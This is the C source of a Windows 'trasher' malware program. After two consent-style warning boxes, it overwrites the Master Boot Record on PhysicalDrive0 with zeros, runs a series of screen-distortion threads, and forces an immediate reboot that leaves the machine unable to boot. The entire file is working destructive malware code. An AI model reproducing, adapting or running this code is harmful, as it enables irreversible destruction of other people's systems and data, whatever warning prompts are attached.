#include <Windows.h>
#include "payloads.h"

#define MBR_SIZE 512

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(0, L"This application is malicious and will make your machine unusable.\n\nDo you want to run ? ", L"TRASHER.exe WARNING", MB_ICONEXCLAMATION | MB_YESNO) == 6)
	{
		if (MessageBoxW(0, L"The creator is not responsible for any damage caused to your machine.\n\nif you really want to run press \"yes\".\n\n By: 4RTUrrrr (github)", L"TRASHER.EXE LAST WARNING", MB_ICONEXCLAMATION | MB_YESNO) == 6)
		{
			DWORD write;
			char mbrData[MBR_SIZE];
			ZeroMemory(&mbrData, (sizeof mbrData));
			HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
			WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL);
			CloseHandle(MasterBootRecord);

			HANDLE hRules = CreateThread(0, 0, &rules, 0, 0, 0);
			
			Sleep(10000);

			HANDLE hTunnel = CreateThread(0, 0, &tunnel, 0, 0, 0);
			Sleep(5000);
			HANDLE hNegative = CreateThread(0, 0, &negative, 0, 0, 0);
			Sleep(10000);

			RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);

			HANDLE hLetters = CreateThread(0, 0, &letters, 0, 0, 0);
			Sleep(20000);

			HANDLE hEllipses = CreateThread(0, 0, &ellipses, 0, 0, 0);
			Sleep(20000);

			TerminateThread(hTunnel, 0);
			CloseHandle(hTunnel);

			HANDLE hZoom = CreateThread(0, 0, &zoom, 0, 0, 0);
			Sleep(20000);

			TerminateThread(hEllipses, 0);
			CloseHandle(hEllipses);
			TerminateThread(hLetters, 0);
			CloseHandle(hLetters);
			TerminateThread(hRules, 0);
			CloseHandle(hRules);
			TerminateThread(hZoom, 0);
			CloseHandle(hZoom);

			HANDLE hRules1 = CreateThread(0, 0, &rules, 0, 0, 0);
			HANDLE hTunnel1 = CreateThread(0, 0, &tunnel, 0, 0, 0);
			HANDLE hNegative1 = CreateThread(0, 0, &negative, 0, 0, 0);
			HANDLE hLetters1 = CreateThread(0, 0, &letters, 0, 0, 0);
			HANDLE hZoom1 = CreateThread(0, 0, &zoom, 0, 0, 0);
			HANDLE hEllipses1 = CreateThread(0, 0, &ellipses, 0, 0, 0);

			Sleep(30000);

			TerminateThread(hEllipses1, 0);
			CloseHandle(hEllipses1);
			TerminateThread(hLetters1, 0);
			CloseHandle(hLetters1);
			TerminateThread(hRules1, 0);
			CloseHandle(hRules1);
			TerminateThread(hZoom1, 0);
			CloseHandle(hZoom1);

			system("shutdown -r -t 0 -f");
		}
	}
}